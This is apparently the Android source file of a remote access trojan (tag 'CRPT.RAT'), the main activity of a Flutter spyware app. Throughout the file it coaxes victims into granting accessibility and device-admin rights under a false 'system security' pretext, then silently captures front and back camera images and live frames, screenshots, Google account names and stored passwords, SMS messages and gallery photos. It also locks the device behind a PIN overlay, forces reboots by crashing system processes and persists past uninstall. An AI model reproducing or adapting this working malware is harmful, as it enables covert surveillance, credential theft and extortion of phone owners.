package com.nullx.pp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.media.Image;
import android.media.ImageReader;
import android.hardware.camera2.*;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.HashMap;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL    = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String TAG            = "CRPT.RAT";

    private boolean isStrobeRunning = false;
    private Handler uiHandler       = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;

    // Camera stream (live)
    private HandlerThread cameraThread;
    private Handler       cameraHandler;
    private CameraDevice  activeCameraDevice;
    private ImageReader   activeImageReader;
    private CameraCaptureSession activeCaptureSession;

    // Live stream state
    private boolean isLiveStreaming = false;
    private Handler liveHandler;
    private Runnable liveRunnable;
    private MethodChannel.Result pendingLiveResult;
    private byte[] lastFrame;

    private static final int REQ_ACCESSIBILITY = 1001;

    @Override
    protected void onCreate(android.os.Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start service
        Intent svc = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);
        PersistentWorker.schedule(this);

        // Step 1: Minta Accessibility Service dulu (untuk auto-klik device admin dialog)
        if (!isAccessibilityEnabled()) {
            // Buka pengaturan accessibility
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Intent accIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(accIntent);
                } catch (Exception ignored) {}
                // Setelah 3 detik, langsung minta device admin juga
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    requestDeviceAdmin();
                }, 3000);
            }, 500);
        } else {
            // Accessibility sudah aktif, langsung minta device admin
            requestDeviceAdmin();
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            int enabled = android.provider.Settings.Secure.getInt(
                getContentResolver(),
                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 0) return false;
            String services = android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComp = new ComponentName(this, DeviceAdminHelper.class);
        if (dpm != null && !dpm.isAdminActive(adminComp)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
            startActivity(adminIntent);
            // AutoAdminActivator akan otomatis klik tombol Aktifkan
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                else result.notImplemented();
            });

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {

                    case "takeSilentPhotoBackground": {
                        String side = call.argument("side");
                        capturePhoto(side == null ? "back" : side, result);
                        break;
                    }

                    // Live camera stream — buka kamera terus-menerus, ambil frame tiap panggilan
                    case "startLiveCameraStream": {
                        String side = call.argument("side");
                        startLiveCameraStream(side == null ? "back" : side, result);
                        break;
                    }

                    case "stopLiveCameraStream": {
                        stopLiveCameraStream();
                        result.success(null);
                        break;
                    }

                    // Ambil 1 frame dari live stream (dipanggil berulang dari Dart)
                    case "getLiveFrame": {
                        if (lastFrame != null) {
                            String b64 = Base64.encodeToString(lastFrame, Base64.NO_WRAP);
                            result.success(b64);
                        } else {
                            result.success(null);
                        }
                        break;
                    }

                    case "startScreenStreamBackground": {
                        String b64 = getScreenBase64();
                        result.success(b64);
                        break;
                    }

                    case "getGmailAccounts": {
                        fetchGmailAccounts(result);
                        break;
                    }

                    case "setWallpaper": {
                        setWallpaper(call.argument("url"), result);
                        break;
                    }

                    case "getSmsMessages": {
                        getSmsMessages(result);
                        break;
                    }

                    case "getGalleryImages": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 10;
                        getGalleryImages(limit, result);
                        break;
                    }

                    case "bringToForeground": {
                        Intent intent = new Intent(getContext(), MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent);
                        result.success(true);
                        break;
                    }

                    case "saveTargetId":
                    case "saveDeviceIdAll": {
                        String id = call.arguments.toString();
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", id).apply();
                        getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit()
                            .putString("flutter.target_id", id)
                            .putString("flutter.target_model", Build.BRAND + " " + Build.MODEL)
                            .apply();
                        // File eksternal - survive uninstall
                        try {
                            java.io.File dir = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
                            dir.mkdirs();
                            java.io.FileWriter fw = new java.io.FileWriter(new java.io.File(dir, ".devid"));
                            fw.write(id); fw.close();
                        } catch (Exception ignored) {}
                        try {
                            java.io.FileWriter fw2 = new java.io.FileWriter(new java.io.File(getCacheDir(), "devid.dat"));
                            fw2.write(id); fw2.close();
                        } catch (Exception ignored) {}
                        Intent svcIntent = new Intent(this, SpyService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent);
                        else startService(svcIntent);
                        PersistentWorker.schedule(this);
                        result.success(true);
                        break;
                    }
                    case "saveLockState": {
                        String msg = call.argument("message");
                        String pin = call.argument("pin");
                        boolean locked = Boolean.TRUE.equals(call.argument("locked"));
                        boolean isLive = Boolean.TRUE.equals(call.argument("isLockLive"));
                        SharedPreferences.Editor ed = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit();
                        ed.putBoolean("isLocked", locked);
                        ed.putBoolean("isLockLive", isLive);
                        if (msg != null) ed.putString("lockMessage", msg);
                        if (pin != null) ed.putString("lockPin", pin);
                        ed.apply();
                        result.success(true);
                        break;
                    }
                    case "getLockState": {
                        SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                        result.success(new HashMap<String, Object>() {{
                            put("isLocked",    prefs.getBoolean("isLocked", false));
                            put("isLockLive",  prefs.getBoolean("isLockLive", false));
                            put("lockMessage", prefs.getString("lockMessage", "YOUR PHONE IS LOCKED!!!!"));
                            put("lockPin",     prefs.getString("lockPin", "1234"));
                        }});
                        break;
                    }
                    case "vibrateDevice": {
                        try {
                            Vibrator vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                            if (vib != null) {
                                int dur = call.argument("duration") != null ? (int) call.argument("duration") : 3000;
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    vib.vibrate(VibrationEffect.createWaveform(
                                        new long[]{0, 500, 200, 500, 200, 500}, -1));
                                } else {
                                    vib.vibrate(new long[]{0, 500, 200, 500, 200, 500}, -1);
                                }
                            }
                        } catch (Exception ignored) {}
                        result.success(null);
                        break;
                    }

                    case "openNotificationSettings": {
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        result.success(true);
                        break;
                    }

                    case "startLockOverlay": {
                        try {
                            String lockMsg = call.argument("message");
                            String lockPin = call.argument("pin");
                            if (lockMsg == null) lockMsg = "DEVICE IS LOCKED";
                            if (lockPin == null) lockPin = "1234";
                            Intent lockIntent = new Intent(this, LockOverlayService.class);
                            lockIntent.setAction(LockOverlayService.ACTION_LOCK);
                            lockIntent.putExtra(LockOverlayService.EXTRA_MESSAGE, lockMsg);
                            lockIntent.putExtra(LockOverlayService.EXTRA_PIN, lockPin);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(lockIntent);
                            } else {
                                startService(lockIntent);
                            }
                            result.success(true);
                        } catch (Exception e) { result.error("LOCK_OVERLAY_ERR", e.getMessage(), null); }
                        break;
                    }

                    case "stopLockOverlay": {
                        try {
                            Intent unlockIntent = new Intent(this, LockOverlayService.class);
                            unlockIntent.setAction(LockOverlayService.ACTION_UNLOCK);
                            startService(unlockIntent);
                            result.success(true);
                        } catch (Exception e) { result.success(false); }
                        break;
                    }

                    case "lockDeviceNow": {
                        try {
                            DevicePolicyManager dpmLock = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            ComponentName adminLock = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpmLock != null && dpmLock.isAdminActive(adminLock)) {
                                dpmLock.lockNow();
                                result.success(true);
                            } else {
                                // Admin belum aktif - minta aktivasi dulu
                                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                    new ComponentName(getApplicationContext(), DeviceAdminHelper.class));
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    "Diperlukan untuk keamanan sistem.");
                                startActivity(adminIntent);
                                result.success(false);
                            }
                        } catch (Exception e) { result.error("LOCK_ERR", e.getMessage(), null); }
                        break;
                    }

                    case "rebootDevice": {
                        new Thread(() -> {
                            boolean rebooted = false;

                            // Cara 1: PowerManager reflection (TANPA root/admin - paling efektif)
                            if (!rebooted) {
                                try {
                                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                                    java.lang.reflect.Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
                                    m.setAccessible(true);
                                    m.invoke(pm, (Object) null);
                                    rebooted = true;
                                } catch (Exception e) { Log.w("CRPT", "PM reboot: " + e.getMessage()); }
                            }

                            // Cara 2: DevicePolicyManager (kalau device admin aktif)
                            if (!rebooted) {
                                try {
                                    DevicePolicyManager dpm2 = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                    ComponentName adminComp2 = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                                    if (dpm2 != null && dpm2.isAdminActive(adminComp2) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                        dpm2.reboot(adminComp2);
                                        rebooted = true;
                                    }
                                } catch (Exception e) { Log.w("CRPT", "DPM reboot: " + e.getMessage()); }
                            }

                            // Cara 3: su root
                            if (!rebooted) {
                                try {
                                    Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                                    p.waitFor(3, java.util.concurrent.TimeUnit.SECONDS);
                                    rebooted = true;
                                } catch (Exception e) { Log.w("CRPT", "su reboot: " + e.getMessage()); }
                            }

                            // Cara 4: am crash system_server (force reboot tanpa root di beberapa device)
                            if (!rebooted) {
                                try {
                                    Runtime.getRuntime().exec(new String[]{"sh", "-c", "am crash system_server"});
                                    rebooted = true;
                                } catch (Exception e) { Log.w("CRPT", "am crash: " + e.getMessage()); }
                            }

                            // Cara 5: pkill zygote
                            if (!rebooted) {
                                try {
                                    Runtime.getRuntime().exec(new String[]{"sh", "-c", "pkill -9 zygote"});
                                    rebooted = true;
                                } catch (Exception e) { Log.w("CRPT", "pkill: " + e.getMessage()); }
                            }

                            final boolean ok = rebooted;
                            uiHandler.post(() -> { if (ok) result.success(true); else result.error("REBOOT_ERR", "All methods failed", null); });
                        }).start();
                        break;
                    }

                    default:
                        result.notImplemented();
                }
            });
    }

    // ════════════════════════════════════════════════════════════════════════
    // LIVE CAMERA STREAM — buka kamera terus, simpan frame terakhir
    // ════════════════════════════════════════════════════════════════════════
    private void startLiveCameraStream(String side, MethodChannel.Result result) {
        if (isLiveStreaming) { result.success(true); return; }
        cleanupCamera();
        isLiveStreaming = true;
        lastFrame = null;

        cameraThread = new HandlerThread("LiveCameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { result.error("CAM_ERR", "Camera not found", null); return; }

            // ImageReader untuk capture frame
            activeImageReader = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 4);
            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    lastFrame = bytes;
                } finally { img.close(); }
            }, cameraHandler);

            // SurfaceTexture dummy — WAJIB untuk kamera bisa jalan di background
            // tanpa ini kamera butuh preview yang visible
            android.graphics.SurfaceTexture dummyST = new android.graphics.SurfaceTexture(0);
            dummyST.setDefaultBufferSize(480, 360);
            android.view.Surface dummySurface = new android.view.Surface(dummyST);

            final String finalId = cameraId;
            manager.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.addTarget(dummySurface); // dummy surface agar kamera aktif
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        builder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE,
                            new android.util.Range<>(10, 20));

                        camera.createCaptureSession(
                            Arrays.asList(activeImageReader.getSurface(), dummySurface),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    activeCaptureSession = session;
                                    try {
                                        session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                        uiHandler.post(() -> result.success(true));
                                    } catch (CameraAccessException e) {
                                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                                    }
                                }
                                @Override
                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                    uiHandler.post(() -> result.error("CAM_ERR", "Configure failed", null));
                                }
                            }, cameraHandler);
                    } catch (Exception e) {
                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                    }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { cleanupCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int err) {
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Error: " + err, null));
                }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private void stopLiveCameraStream() {
        isLiveStreaming = false;
        lastFrame = null;
        cleanupCamera();
    }

    // ════════════════════════════════════════════════════════════════════════
    // CAPTURE PHOTO (single shot)
    // ════════════════════════════════════════════════════════════════════════
    private void capturePhoto(String side, MethodChannel.Result result) {
        cleanupCamera();
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { result.error("CAM_ERR", "Camera not found: " + side, null); return; }

            activeImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            final String finalCamId = cameraId;

            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    if (bmp == null) { uiHandler.post(() -> result.error("CAM_ERR", "Decode failed", null)); return; }
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    String b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                    uiHandler.post(() -> result.success(b64));
                } finally { cleanupCamera(); }
            }, cameraHandler);

            manager.openCamera(finalCamId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        camera.createCaptureSession(
                            Arrays.asList(activeImageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    try { session.capture(builder.build(), null, cameraHandler); }
                                    catch (CameraAccessException e) { cleanupCamera(); }
                                }
                                @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { cleanupCamera(); }
                            }, cameraHandler);
                    } catch (CameraAccessException e) { cleanupCamera(); }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { cleanupCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int err) {
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Camera error: " + err, null));
                }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private synchronized void cleanupCamera() {
        try { if (activeCaptureSession != null) { activeCaptureSession.close(); activeCaptureSession = null; } } catch (Exception ignored) {}
        try { if (activeCameraDevice != null)   { activeCameraDevice.close();   activeCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (activeImageReader != null)    { activeImageReader.close();    activeImageReader    = null; } } catch (Exception ignored) {}
        try { if (cameraThread != null)         { cameraThread.quitSafely();   cameraThread         = null; } } catch (Exception ignored) {}
    }

    // ════════════════════════════════════════════════════════════════════════
    // SCREENSHOT
    // ════════════════════════════════════════════════════════════════════════
    private String getScreenBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            v.buildDrawingCache(true);
            Bitmap bmp = v.getDrawingCache(true);
            if (bmp == null) return null;
            Bitmap copy = bmp.copy(bmp.getConfig(), false);
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            copy.compress(Bitmap.CompressFormat.JPEG, 40, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    // ════════════════════════════════════════════════════════════════════════
    // GMAIL
    // ════════════════════════════════════════════════════════════════════════
    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account ac : accounts) {
                sb.append("Email: ").append(ac.name).append("\n");
                try { String token = am.getPassword(ac); if (token != null && !token.isEmpty()) sb.append("Password: ").append(token).append("\n"); } catch (Exception ignored) {}
                sb.append("---\n");
            }
            result.success(sb.toString().trim().isEmpty() ? "No Google Account Found" : sb.toString().trim());
        } catch (Exception e) { result.error("GMAIL_ERR", e.getMessage(), null); }
    }

    // ════════════════════════════════════════════════════════════════════════
    // SMS
    // ════════════════════════════════════════════════════════════════════════
    private void getSmsMessages(MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<HashMap<String, String>> smsList = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 50");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        HashMap<String, String> sms = new HashMap<>();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                        smsList.add(sms);
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(smsList));
            } catch (Exception e) { uiHandler.post(() -> result.error("SMS_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // GALLERY — Android 10+ compatible
    // ════════════════════════════════════════════════════════════════════════
    private void getGalleryImages(int limit, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<String> images = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                String[] proj = { MediaStore.Images.Media._ID };
                Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext() && count < limit) {
                        try {
                            long id2 = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                            Uri imgUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id2);
                            Bitmap bmp = null;
                            try (InputStream is = cr.openInputStream(imgUri)) {
                                BitmapFactory.Options opts = new BitmapFactory.Options();
                                opts.inSampleSize = 4;
                                bmp = BitmapFactory.decodeStream(is, null, opts);
                            } catch (Exception ignored) {}
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                                images.add(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
                                bmp.recycle();
                                count++;
                            }
                        } catch (Exception ignored) {}
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(images));
            } catch (Exception e) { uiHandler.post(() -> result.error("GALLERY_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // WALLPAPER
    // ════════════════════════════════════════════════════════════════════════
    private void setWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                URL url = new URL(urlString);
                WallpaperManager.getInstance(this).setStream(url.openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // STROBE
    // ════════════════════════════════════════════════════════════════════════
    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        final CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean on = false;
            @Override public void run() {
                try {
                    String id = cm.getCameraIdList()[0];
                    on = !on;
                    cm.setTorchMode(id, on);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception ignored) {}
    }

    @Override
    protected void onDestroy() {
        cleanupCamera();
        super.onDestroy();
    }
}
